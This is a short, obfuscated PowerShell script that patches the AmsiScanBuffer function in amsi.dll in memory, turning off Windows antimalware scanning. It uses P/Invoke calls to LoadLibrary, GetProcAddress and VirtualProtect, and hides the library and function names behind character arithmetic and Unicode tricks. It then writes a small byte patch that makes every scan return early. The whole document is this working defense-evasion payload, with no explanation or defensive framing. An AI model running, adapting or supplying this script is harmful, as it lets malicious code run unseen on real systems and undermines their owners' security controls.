

[PSObject].Assembly.GetType('System.Management.Automation.TypeAccelerators')::Add("KJBGZEYYWRPW", 'System.Runtime.InteropServices.Marshal');
$SZJRD = @"
using System;
using System.Runtime.InteropServices;
public class SZJRD {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}
"@

Add-Type $SZJRD

$PHUXHCS = [SZJRD]::LoadLibrary("$('ámsì.dll'.noRMaLiZe([cHaR]([BYTE]0x46)+[CHaR](59+52)+[cHaR](115-1)+[char]([BYte]0x6D)+[cHAR]([BYTE]0x44)) -replace [cHAR](55+37)+[Char](672/6)+[ChaR]([Byte]0x7B)+[chAr](112-35)+[ChAR]([bytE]0x6E)+[ChAr](9375/75))");
$MWHITD = [SZJRD]::GetProcAddress($PHUXHCS, "$([ChAR](36+29)+[chAr]([bytE]0x6D)+[CHar](115)+[CHAr]([byte]0x69)+[cHAr](56+27)+[ChAR]([bYTE]0x63)+[Char]([BYTE]0x61)+[char](143-33)+[CHaR]([BYtE]0x42)+[chaR]([ByTE]0x75)+[cHAR](9894/97)+[chAR](20+82)+[CHaR](102-1)+[cHAr]([BYte]0x72))");
$p = 0;
[SZJRD]::VirtualProtect($MWHITD, [uint32]5, 0x40, [ref]$p);
$GFKN = "0xB8";
$CCJK = "0x57";
$ZZLM = "0x00";
$VMMX = "0x07";
$TRZP = "0x80";
$CGJT = "0xC3";
$WBUNX = [Byte[]] ($GFKN,$CCJK,$ZZLM,$VMMX,+$TRZP,+$CGJT);
[KJBGZEYYWRPW]::Copy($WBUNX, 0, $MWHITD, 6);